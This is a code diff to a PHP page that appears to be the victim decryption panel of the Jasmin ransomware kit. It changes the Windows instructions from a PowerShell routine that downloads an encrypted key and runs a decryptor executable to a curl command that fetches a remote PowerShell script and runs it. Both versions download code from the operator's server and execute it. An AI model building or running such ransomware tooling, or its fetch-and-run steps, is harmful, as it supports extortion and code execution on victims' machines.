@@ -16,27 +16,11 @@ $aes_pwd = is_file($ks_path) ? trim(file_get_contents($ks_path)) : 'KEY_NOT_SET'
 
 <div class="dt-content" id="dt-win">
 <h3>🖥️ Windows 一键解密</h3>
-<pre class="dt-code">$tmp="$env:TEMP\jasmin_dec"
-New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-$k="<?=$aes_pwd?>"
-Invoke-WebRequest "<?=$srv?>/payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
-# AES解密私钥
-$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
-$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
-$aes=[System.Security.Cryptography.Aes]::Create()
-$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
-$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
-$dec=$aes.CreateDecryptor()
-$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
-$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
-$sr=New-Object IO.StreamReader($cs)
-[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
-$sr.Close();$cs.Close();$ms.Close()
-# 下载解密器并运行
-# 注: 需先将 Jasmin_Decryptor.exe 放入 payloads/ (仓库未附编译产物)
-Invoke-WebRequest "<?=$srv?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
-& "$tmp\dec.exe" "$tmp\key.pem"
-Remove-Item -Recurse -Force $tmp</pre>
+<pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
+:: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
+curl.exe -sL <?=$srv?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
+pwsh -File jasmin_unlock.ps1 -Server <?=$srv?> -K "<?=$aes_pwd?>" -Paths C:\path\to\decrypt
+:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 </div>
 
 <div class="dt-content" id="dt-linux" style="display:none">
